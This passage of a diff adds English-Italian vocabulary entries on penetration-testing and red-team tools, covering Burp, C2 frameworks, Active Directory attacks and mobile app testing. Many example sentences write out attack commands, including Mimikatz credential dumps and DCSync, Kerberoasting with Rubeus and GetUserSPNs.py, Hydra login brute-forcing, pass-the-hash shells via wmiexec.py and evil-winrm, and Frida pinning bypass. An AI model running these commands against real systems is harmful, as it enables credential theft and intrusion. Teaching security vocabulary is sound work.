+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Capture Filter",
+      "set": {
+        "example": "A capture filter 'tcp port 443 and host 10.0.0.5' kept the pcap small enough to fit in RAM during a multi-hour engagement. = Un capture filter 'tcp port 443 and host 10.0.0.5' ha mantenuto il pcap abbastanza piccolo da stare in RAM durante un engagement di più ore."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "tcpdump",
+      "set": {
+        "italian": "tcpdump",
+        "example": "On a headless server the responder typed tcpdump -i eth0 -w /tmp/inc.pcap host 10.0.0.5 to grab evidence before rotating the host. = Su un server headless il responder ha digitato tcpdump -i eth0 -w /tmp/inc.pcap host 10.0.0.5 per acquisire evidence prima di ruotare l'host."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "tshark",
+      "set": {
+        "italian": "tshark",
+        "example": "During DFIR, tshark -r capture.pcap -Y 'dns and dns.qry.name contains \"badc2\"' surfaced 47 DNS lookups to the suspected C2 domain. = Durante il DFIR, tshark -r capture.pcap -Y 'dns and dns.qry.name contains \"badc2\"' ha rivelato 47 lookup DNS verso il dominio C2 sospetto."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Burp Suite Professional",
+      "set": {
+        "italian": "Burp Suite Professional",
+        "example": "Burp Suite Professional's active scanner found a blind SQLi and a stored XSS in the same login flow during the first afternoon of testing. = Lo scanner attivo di Burp Suite Professional ha trovato una SQLi cieca e un XSS persistente nello stesso flusso di login durante il primo pomeriggio di test."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Burp Extender",
+      "set": {
+        "italian": "Burp Extender",
+        "example": "Through Burp Extender the tester installed Logger++, Param Miner, and Autorize to extend coverage of every request the scanner sees. = Tramite Burp Extender il tester ha installato Logger++, Param Miner e Autorize per estendere la copertura di ogni richiesta che lo scanner vede."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Turbo Intruder",
+      "set": {
+        "italian": "Turbo Intruder",
+        "example": "On the race-condition test, Turbo Intruder fired 30000 payloads in three seconds, far beyond stock Intruder's throughput on one host. = Sul test di race-condition, Turbo Intruder ha sparato 30000 payload in tre secondi, ben oltre il throughput di Intruder standard su un host."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Proxy History",
+      "set": {
+        "example": "Sorting Burp's proxy history by status code surfaced two 500 responses that hinted at an unhandled SQL exception worth chasing. = Ordinare la proxy history di Burp per status code ha rivelato due risposte 500 che suggerivano un'eccezione SQL non gestita da indagare."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_3",
+      "english": "Caido",
+      "set": {
+        "italian": "Caido",
+        "example": "The team trialed Caido as a lighter alternative to Burp for quick API testing on the bug-bounty programs they monitor. = Il team ha sperimentato Caido come alternativa più leggera a Burp per il test rapido di API sui programmi bug-bounty che monitora."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "sqlmap",
+      "set": {
+        "english": "sqlmap Tamper Script",
+        "italian": "tamper script di sqlmap",
+        "example": "A sqlmap tamper script like 'between' encoded payloads to evade a naive WAF that blocked the equals sign in the original SQLi request. = Uno tamper script di sqlmap come 'between' ha codificato i payload per eludere un WAF naive che bloccava il segno uguale nella richiesta SQLi originale."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Nikto",
+      "set": {
+        "english": "Nikto Web Vulnerability Scan",
+        "italian": "scansione vulnerabilità web con Nikto",
+        "example": "A Nikto web vulnerability scan against the staging server flagged outdated jQuery and a debug page indexed in robots.txt. = Una scansione vulnerabilità web con Nikto contro il server di staging ha segnalato jQuery obsoleto e una pagina di debug indicizzata in robots.txt."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Recon-ng",
+      "set": {
+        "english": "Recon-ng Module",
+        "italian": "modulo di Recon-ng",
+        "example": "A Recon-ng module like recon/domains-hosts/google_site_web cataloged 220 subdomains for the target in a single workspace dump. = Un modulo di Recon-ng come recon/domains-hosts/google_site_web ha catalogato 220 sottodomini per il target in un singolo dump di workspace."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Hydra",
+      "set": {
+        "english": "Hydra HTTP Form Login",
+        "italian": "brute force di form HTTP con Hydra",
+        "example": "A Hydra HTTP form login attack used hydra -L users -P pass.txt host http-post-form '/login:user=^USER^&pwd=^PASS^:F=Invalid'. = Un brute force di form HTTP con Hydra ha usato hydra -L users -P pass.txt host http-post-form '/login:user=^USER^&pwd=^PASS^:F=Invalid'."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Empire",
+      "set": {
+        "italian": "Empire",
+        "example": "The red team used Empire's PowerShell agents to keep operators in memory on Windows hosts without ever dropping an exe to disk. = Il red team ha usato gli agenti PowerShell di Empire per tenere gli operatori in memoria su host Windows senza mai lasciare un exe su disco."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Sliver",
+      "set": {
+        "italian": "Sliver",
+        "example": "Internally, Sliver replaced the team's old Cobalt Strike licence, offering mTLS C2, DNS C2, and multi-platform implants out of the box. = Internamente, Sliver ha sostituito la vecchia licenza Cobalt Strike del team, offrendo C2 mTLS, C2 DNS e implant multi-piattaforma."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Havoc",
+      "set": {
+        "italian": "Havoc",
+        "example": "On the latest Windows-heavy red team engagement, Havoc's modern UI and customizable Demon agent made it the team's preferred pick. = Sull'ultimo red team engagement molto Windows, l'UI moderna e l'agente Demon personalizzabile di Havoc lo hanno reso la scelta preferita del team."
+      }
+    },
+    {
+      "level": "13",
+      "lesson": "ethack_tools_4",
+      "english": "Mythic",
+      "set": {
+        "italian": "Mythic",
+        "example": "Thanks to its multi-agent design, Mythic let operators run an Apollo .NET agent on Windows and a Poseidon Go agent on macOS in parallel. = Grazie al design multi-agente, Mythic ha permesso agli operatori di far girare un Apollo .NET su Windows e un Poseidon Go su macOS in parallelo."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Cobalt Strike",
+      "set": {
+        "italian": "Cobalt Strike",
+        "example": "An adversary-emulation engagement chose Cobalt Strike for its Malleable C2 profiles that blend Beacon traffic with normal CDN HTTPS. = Un engagement di adversary-emulation ha scelto Cobalt Strike per i suoi profili Malleable C2 che mescolano il traffico Beacon col normale HTTPS CDN."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Beacon",
+      "set": {
+        "italian": "Beacon",
+        "example": "Cobalt Strike's Beacon implant supports SMB, HTTP, HTTPS, and DNS callbacks, switching transport on the fly if one channel is blocked. = L'implant Beacon di Cobalt Strike supporta callback SMB, HTTP, HTTPS e DNS, cambiando trasporto al volo se un canale viene bloccato."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Aggressor Script",
+      "set": {
+        "italian": "Aggressor Script",
+        "example": "An Aggressor Script automated the team's standard kill-chain: privesc check, Mimikatz, lateral move with PsExec, then sleep+jitter bump. = Uno Aggressor Script ha automatizzato la kill-chain standard del team: check di privesc, Mimikatz, movimento laterale con PsExec, poi bump di sleep e jitter."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Malleable C2",
+      "set": {
+        "example": "A malleable C2 profile shaped Beacon's HTTP traffic to mimic a Jquery CDN, getting past a customer's signature-based egress filter. = Un profilo C2 malleabile ha modellato il traffico HTTP di Beacon per imitare una CDN Jquery, superando un filtro egress signature-based del cliente."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "PowerShell Empire",
+      "set": {
+        "italian": "PowerShell Empire",
+        "example": "Although deprecated by the original authors, PowerShell Empire's BC-Security fork is still used in many adversary emulation labs. = Sebbene deprecato dagli autori originali, il fork BC-Security di PowerShell Empire è ancora usato in molti lab di adversary emulation."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Listener",
+      "set": {
+        "example": "Configuring an HTTPS listener on port 443 with a valid Let's Encrypt cert made the C2 server look just like any other web service. = Configurare un listener HTTPS sulla porta 443 con un certificato valido Let's Encrypt ha fatto sembrare il server C2 come qualsiasi altro servizio web."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Beaconing",
+      "set": {
+        "example": "The defender flagged the implant from its rigid beaconing interval of exactly 60 seconds, which no human-driven traffic would mimic. = Il defender ha segnalato l'implant dal suo intervallo rigido di beaconing di esattamente 60 secondi, che nessun traffico human-driven imiterebbe."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_1",
+      "english": "Jitter",
+      "set": {
+        "italian": "Jitter",
+        "example": "Adding 30% jitter to a 60-second beacon spreads callbacks between 42 and 78 seconds, frustrating detection rules tuned to fixed intervals. = Aggiungere il 30% di jitter a un beacon di 60 secondi spalma le callback tra 42 e 78 secondi, frustrando le rule di detection tarate su intervalli fissi."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Mimikatz",
+      "set": {
+        "english": "Mimikatz LSA Dump",
+        "italian": "dump LSA di Mimikatz",
+        "example": "A Mimikatz LSA dump via 'sekurlsa::logonpasswords' on the compromised file server returned twelve cleartext passwords from active sessions. = Un dump LSA di Mimikatz tramite 'sekurlsa::logonpasswords' sul file server compromesso ha restituito dodici password in chiaro da sessioni attive."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "sekurlsa",
+      "set": {
+        "italian": "sekurlsa",
+        "example": "The sekurlsa::tickets /export command writes every Kerberos ticket currently in LSASS to disk as .kirbi files for offline reuse. = Il comando sekurlsa::tickets /export scrive ogni ticket Kerberos attualmente in LSASS su disco come file .kirbi per riutilizzo offline."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "lsadump",
+      "set": {
+        "italian": "lsadump",
+        "example": "With domain replication rights, lsadump::dcsync /user:krbtgt pulled the KRBTGT NTLM hash and enabled an immediate Golden Ticket forge. = Con diritti di replica del dominio, lsadump::dcsync /user:krbtgt ha estratto l'hash NTLM di KRBTGT e ha abilitato la forge immediata di un Golden Ticket."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Kekeo",
+      "set": {
+        "italian": "Kekeo",
+        "example": "When Mimikatz fell short, Kekeo handled the Kerberos-specific flows like S4U2self and S4U2proxy abuses across forest trusts. = Quando Mimikatz non bastava, Kekeo ha gestito i flussi specifici di Kerberos come gli abusi S4U2self e S4U2proxy attraverso i trust di foresta."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Rubeus",
+      "set": {
+        "italian": "Rubeus",
+        "example": "The command Rubeus kerberoast /outfile:hashes.txt enumerated SPN accounts and dumped roastable tickets ready for hashcat -m 13100. = Il comando Rubeus kerberoast /outfile:hashes.txt ha enumerato gli account SPN e ha esportato i ticket roastable pronti per hashcat -m 13100."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "Pypykatz",
+      "set": {
+        "italian": "Pypykatz",
+        "example": "On a Linux investigator workstation, pypykatz lsa minidump lsass.dmp parsed an offline LSASS dump without needing any Windows machine. = Su una workstation investigatore Linux, pypykatz lsa minidump lsass.dmp ha parsato un dump LSASS offline senza bisogno di nessuna macchina Windows."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "LaZagne",
+      "set": {
+        "italian": "LaZagne",
+        "example": "On a compromised workstation, LaZagne all dumped saved credentials from Chrome, Firefox, Outlook, and FileZilla in a single sweep. = Su una workstation compromessa, LaZagne all ha esportato credenziali salvate da Chrome, Firefox, Outlook e FileZilla in una sola passata."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "SeatBelt",
+      "set": {
+        "italian": "SeatBelt",
+        "example": "A SeatBelt all run dumped Windows config, network, and security data the operator needed to plan privesc without firing extra binaries. = Un'esecuzione di SeatBelt all ha esportato configurazione Windows, dati di rete e sicurezza di cui l'operatore aveva bisogno per pianificare la privesc senza lanciare binari extra."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "SharpUp",
+      "set": {
+        "italian": "SharpUp",
+        "example": "A SharpUp audit run listed unquoted service paths, modifiable services, and DLL hijack opportunities that the operator chained to SYSTEM. = Un'esecuzione di SharpUp audit ha elencato percorsi di servizio non quotati, servizi modificabili e opportunità di DLL hijack che l'operatore ha concatenato a SYSTEM."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_2",
+      "english": "WinPEAS",
+      "set": {
+        "italian": "WinPEAS",
+        "example": "On the foothold, WinPEAS color-coded its output so the operator spotted high-confidence privesc paths like writable services in red. = Sul foothold, WinPEAS ha colorato l'output così l'operatore ha individuato in pochi secondi percorsi di privesc come servizi scrivibili in rosso."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "BloodHound",
+      "set": {
+        "english": "BloodHound Attack Path Query",
+        "italian": "query di percorso d'attacco BloodHound",
+        "example": "A custom BloodHound attack path query found six paths to Domain Admins that took fewer than four hops from any Tier-2 account. = Una query di percorso d'attacco BloodHound personalizzata ha trovato sei percorsi a Domain Admins lunghi meno di quattro hop da qualsiasi account Tier-2."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "SharpHound",
+      "set": {
+        "italian": "SharpHound",
+        "example": "A SharpHound -CollectionMethods All run ingested every user, group, and ACL relationship into BloodHound for offline path analysis. = Un'esecuzione di SharpHound -CollectionMethods All ha ingerito ogni relazione utente, gruppo e ACL in BloodHound per l'analisi di percorso offline."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "PowerView",
+      "set": {
+        "italian": "PowerView",
+        "example": "The command PowerView's Get-NetGroupMember 'Domain Admins' surfaced six accounts the operator targeted next during the AD recon phase. = Il comando Get-NetGroupMember 'Domain Admins' di PowerView ha rivelato sei account che l'operatore ha targettato dopo nella fase di recon AD."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "ADRecon",
+      "set": {
+        "italian": "ADRecon",
+        "example": "In one report, ADRecon produced a single Excel workbook covering accounts, groups, GPOs, and trusts that the auditor handed to the client. = In un solo report, ADRecon ha prodotto un singolo workbook Excel che copriva account, gruppi, GPO e trust che l'auditor ha consegnato al cliente."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "PingCastle",
+      "set": {
+        "italian": "PingCastle",
+        "example": "A PingCastle health-check report scored the customer's AD at 75/100 and flagged stale Kerberos accounts as the top remediation item. = Un report health-check di PingCastle ha valutato l'AD del cliente a 75/100 e ha segnalato gli account Kerberos stantii come la principale voce di remediation."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "ADCS",
+      "set": {
+        "italian": "ADCS",
+        "example": "A misconfigured ADCS template (ESC1) let any authenticated user request a certificate with arbitrary subject, leading to Domain Admin. = Un template ADCS mal configurato (ESC1) ha permesso a qualsiasi utente autenticato di richiedere un certificato con subject arbitrario, portando a Domain Admin."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "Certipy",
+      "set": {
+        "italian": "Certipy",
+        "example": "In one minute, Certipy find -vulnerable enumerated five ESC1 templates on the customer's ADCS, all exploitable by any domain user. = In un minuto, Certipy find -vulnerable ha enumerato cinque template ESC1 sull'ADCS del cliente, tutti sfruttabili da qualsiasi utente di dominio."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "Coercion Attack",
+      "set": {
+        "example": "A coercion attack like PetitPotam forces a Windows host to authenticate to an attacker-controlled SMB share, ready for NTLM relay. = Un attacco di coercizione come PetitPotam forza un host Windows ad autenticarsi a una share SMB controllata dall'attaccante, pronta per il relay NTLM."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_3",
+      "english": "NTLM Relay",
+      "set": {
+        "example": "Coercing a DC to authenticate to the attacker enables an NTLM relay onto ADCS that mints a DA certificate in under a minute. = Forzare un DC ad autenticarsi all'attaccante abilita un relay NTLM verso ADCS che genera un certificato DA in meno di un minuto."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "Responder",
+      "set": {
+        "english": "Responder Analyze Mode",
+        "italian": "modalità Analyze di Responder",
+        "example": "Running Responder in Analyze mode (-A) lists every broadcast protocol on the segment without poisoning, perfect for a pre-engagement audit. = Eseguire Responder in modalità Analyze (-A) elenca ogni protocollo broadcast del segmento senza poisoning, perfetto per un audit pre-engagement."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "mitm6",
+      "set": {
+        "italian": "mitm6",
+        "example": "By spoofing DHCPv6, mitm6 abused the Windows preference for IPv6 to become default DNS and relay victim auth to ADCS for a fast DA win. = Spoofando DHCPv6, mitm6 ha sfruttato la preferenza di Windows per IPv6 per diventare DNS predefinito e relayare l'auth della vittima ad ADCS per una vittoria DA."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "CrackMapExec",
+      "set": {
+        "english": "CrackMapExec SMB Module",
+        "italian": "modulo SMB di CrackMapExec",
+        "example": "A CrackMapExec SMB module run with -M spider_plus crawled every accessible share for files mentioning 'password' across the subnet. = Un'esecuzione del modulo SMB di CrackMapExec con -M spider_plus ha esplorato ogni share accessibile per file che menzionavano 'password' sulla subnet."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "NetExec",
+      "set": {
+        "english": "NetExec LDAP Module",
+        "italian": "modulo LDAP di NetExec",
+        "example": "The NetExec LDAP module enumerated kerberoastable users and as-rep roastable accounts in one command against the target domain. = Il modulo LDAP di NetExec ha enumerato utenti kerberoastabili e account as-rep roastabili in un solo comando contro il dominio target."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "GetUserSPNs.py",
+      "set": {
+        "italian": "GetUserSPNs.py",
+        "example": "GetUserSPNs.py -request -dc-ip 10.0.0.1 corp/lowuser fetched roastable hashes for every kerberoastable service account in seconds. = GetUserSPNs.py -request -dc-ip 10.0.0.1 corp/lowuser ha recuperato in pochi secondi hash roastable per ogni service account kerberoastabile."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "GetNPUsers.py",
+      "set": {
+        "italian": "GetNPUsers.py",
+        "example": "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass returned AS-REPs for every account flagged DONT_REQ_PREAUTH ready for cracking. = GetNPUsers.py corp.local/ -usersfile users.txt -no-pass ha restituito AS-REP per ogni account con il flag DONT_REQ_PREAUTH pronti per il cracking."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "wmiexec.py",
+      "set": {
+        "italian": "wmiexec.py",
+        "example": "wmiexec.py -hashes :NTLMHASH corp/admin@10.0.0.5 spawned a semi-interactive shell on the file server via WMI without dropping a binary. = wmiexec.py -hashes :NTLMHASH corp/admin@10.0.0.5 ha generato una shell semi-interattiva sul file server tramite WMI senza lasciare un binario."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "evil-winrm",
+      "set": {
+        "italian": "evil-winrm",
+        "example": "The command evil-winrm -i 10.0.0.5 -u svc_backup -H <NTLMHASH> opened a comfortable PowerShell shell on the target via WinRM port 5985. = Il comando evil-winrm -i 10.0.0.5 -u svc_backup -H <NTLMHASH> ha aperto una comoda shell PowerShell sul target via WinRM porta 5985."
+      }
+    },
+    {
+      "level": "14",
+      "lesson": "ethack_advanced_tools_4",
+      "english": "pwntools",
+      "set": {
+        "italian": "pwntools",
+        "example": "A short pwntools script automated the ROP chain crafting, libc leak, and final shell pop for the CTF binary exploitation challenge. = Un breve script pwntools ha automatizzato la costruzione della catena ROP, il leak di libc e il pop finale di shell per la challenge di binary exploitation CTF."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "APK Decompilation",
+      "set": {
+        "example": "An APK decompilation step with jadx revealed hardcoded API keys and a debug-only admin endpoint left exposed in the production build. = Un passo di decompilazione APK con jadx ha rivelato chiavi API hardcoded e un endpoint admin solo-debug lasciato esposto nella build di produzione."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "apktool",
+      "set": {
+        "italian": "apktool",
+        "example": "The command apktool d target.apk extracted the AndroidManifest and Smali sources, ready for editing and rebuilding a tampered version. = Il comando apktool d target.apk ha estratto AndroidManifest e i sorgenti Smali, pronti per essere modificati e per ricostruire una versione manomessa."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "jadx",
+      "set": {
+        "italian": "jadx",
+        "example": "Opening the APK in jadx-gui rebuilt readable Java sources that the auditor diffed against the prior release to spot new endpoints. = Aprire l'APK in jadx-gui ha ricostruito sorgenti Java leggibili che l'auditor ha diffato rispetto alla release precedente per individuare nuovi endpoint."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "AndroidManifest",
+      "set": {
+        "example": "The AndroidManifest declared android:exported='true' on a critical activity, letting any local app launch the password reset flow directly. = L'AndroidManifest dichiarava android:exported='true' su un'activity critica, lasciando che qualsiasi app locale lanciasse direttamente il flusso di reset password."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Smali",
+      "set": {
+        "italian": "Smali",
+        "example": "Editing the Smali to NOP out the root-detection check let the tester run the rebuilt APK on a rooted device without exit. = Modificare lo Smali per NOP-pare il check di root detection ha permesso al tester di eseguire l'APK ricostruito su un device rootato senza che uscisse."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Drozer",
+      "set": {
+        "italian": "Drozer",
+        "example": "During the mobile audit, Drozer enumerated every exported activity, content provider, and broadcast receiver in the target APK. = Durante l'audit mobile, Drozer ha enumerato ogni activity esportata, content provider e broadcast receiver nell'APK target."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "ADB",
+      "set": {
+        "example": "An adb shell pm install --bypass-low-target-sdk-block app.apk pushed the rebuilt instrumented APK to the test device in one step. = Un adb shell pm install --bypass-low-target-sdk-block app.apk ha caricato l'APK strumentato ricostruito sul device di test in un solo passaggio."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Rooting",
+      "set": {
+        "italian": "Rooting",
+        "example": "Through rooting of the Android test phone with Magisk, Frida gained full access to the target app's process memory for hooking. = Tramite il rooting del telefono Android di test con Magisk, Frida ha ottenuto pieno accesso alla memoria del processo dell'app target per l'hooking."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_1",
+      "english": "Android Emulator",
+      "set": {
+        "example": "Running the target APK inside an Android Emulator with a writable system partition let the tester install a CA cert for HTTPS inspection. = Eseguire l'APK target dentro un Android Emulator con system partition scrivibile ha permesso al tester di installare un cert CA per ispezione HTTPS."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "IPA",
+      "set": {
+        "example": "The auditor pulled the .ipa from an enterprise distribution portal and unzipped it to inspect Info.plist and the embedded Mach-O binary. = L'auditor ha scaricato il .ipa da un portale di distribuzione enterprise e l'ha decompresso per ispezionare Info.plist e il binario Mach-O incluso."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Jailbreak",
+      "set": {
+        "example": "A jailbreak via palera1n on the test iPhone gave the auditor SSH access and the ability to attach Frida to any third-party app. = Un jailbreak tramite palera1n sull'iPhone di test ha dato all'auditor accesso SSH e la capacità di collegare Frida a qualsiasi app di terze parti."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Cydia",
+      "set": {
+        "italian": "Cydia",
+        "example": "On a jailbroken iPhone, Cydia installed the OpenSSH and Frida-server packages the auditor needed for the next round of dynamic testing. = Su un iPhone jailbroken, Cydia ha installato i pacchetti OpenSSH e Frida-server di cui l'auditor aveva bisogno per il round successivo di test dinamici."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Frida",
+      "set": {
+        "italian": "Frida",
+        "example": "A Frida script hooked the SSL pinning method at runtime, returning true unconditionally so Burp could see all the app's TLS traffic. = Uno script Frida ha hookato il metodo SSL pinning a runtime, restituendo true incondizionatamente così Burp poteva vedere tutto il traffico TLS dell'app."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Objection",
+      "set": {
+        "italian": "Objection",
+        "example": "The command objection -g com.target.app explore landed the auditor in an interactive Frida REPL preloaded with mobile bypass commands. = Il comando objection -g com.target.app explore ha portato l'auditor in una REPL Frida interattiva precaricata con comandi di bypass mobile."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "SSL Pinning",
+      "set": {
+        "italian": "SSL Pinning",
+        "example": "The app's SSL Pinning rejected the Burp CA until a Frida hook on TrustManager bypassed validation and exposed every API call. = L'SSL Pinning dell'app rifiutava il CA di Burp finché un hook Frida su TrustManager non ha bypassato la validazione ed esposto ogni chiamata API."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "class-dump",
+      "set": {
+        "italian": "class-dump",
+        "example": "On a decrypted iOS binary, class-dump revealed the full Objective-C class layout and method names the auditor needed to plan hooks. = Su un binario iOS decifrato, class-dump ha rivelato il layout completo delle classi Objective-C e i nomi dei metodi di cui l'auditor aveva bisogno per pianificare gli hook."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Hopper",
+      "set": {
+        "italian": "Hopper",
+        "example": "Through pseudo-C decompilation, Hopper made the obfuscated jailbreak-detection routine far easier to understand than raw ARM64 assembly. = Tramite decompilazione pseudo-C, Hopper ha reso la routine di rilevamento jailbreak offuscata molto più facile da capire dell'assembly ARM64 grezzo."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_2",
+      "english": "Keychain",
+      "set": {
+        "italian": "Keychain",
+        "example": "On a jailbroken device, keychain-dumper exported every credential stored by the target app in the iOS Keychain ready for offline review. = Su un device jailbroken, keychain-dumper ha esportato ogni credenziale memorizzata dall'app target nella Keychain iOS pronta per la revisione offline."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "OWASP Mobile Top 10",
+      "set": {
+        "italian": "OWASP Mobile Top 10",
+        "example": "The audit report mapped each finding back to the OWASP Mobile Top 10 so the client could prioritize remediation against an industry baseline. = Il report di audit ha mappato ogni finding sull'OWASP Mobile Top 10 così il cliente poteva prioritizzare la remediation rispetto a una baseline di settore."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "MASVS",
+      "set": {
+        "italian": "MASVS",
+        "example": "The team used MASVS Level 2 as the scoping baseline, ensuring every required cryptographic and storage control was tested explicitly. = Il team ha usato MASVS Livello 2 come baseline di scoping, assicurandosi che ogni controllo crittografico e di storage richiesto fosse testato esplicitamente."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "MSTG",
+      "set": {
+        "italian": "MSTG",
+        "example": "Procedures from MSTG guided the auditor through static and dynamic checks for jailbreak detection, anti-debug, and reverse-engineering. = Le procedure di MSTG hanno guidato l'auditor attraverso check statici e dinamici per rilevamento jailbreak, anti-debug e reverse engineering."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "MobSF",
+      "set": {
+        "italian": "MobSF",
+        "example": "A MobSF static scan of the APK flagged hardcoded AWS keys, a debug flag left on, and three exported activities lacking permission checks. = Una scansione statica di MobSF dell'APK ha segnalato chiavi AWS hardcoded, un flag di debug lasciato attivo e tre activity esportate senza check di permesso."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "Insecure Storage",
+      "set": {
+        "example": "A finding of insecure storage of session tokens in SharedPreferences without encryption meant any backup file leaked active credentials. = Un finding di storage non sicuro dei token di sessione in SharedPreferences senza crittografia significava che ogni file di backup esponeva credenziali attive."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "Hardcoded Secret",
+      "set": {
+        "example": "A hardcoded secret in the decompiled APK turned out to be the production Stripe API key, valid across every customer account. = Un segreto hardcoded nell'APK decompilato si è rivelato essere la chiave API Stripe di produzione, valida su ogni account cliente."
+      }
+    },
+    {
+      "level": "15",
+      "lesson": "ethack_mobile_hacking_3",
+      "english": "Insecure Deeplink",
+      "set": {
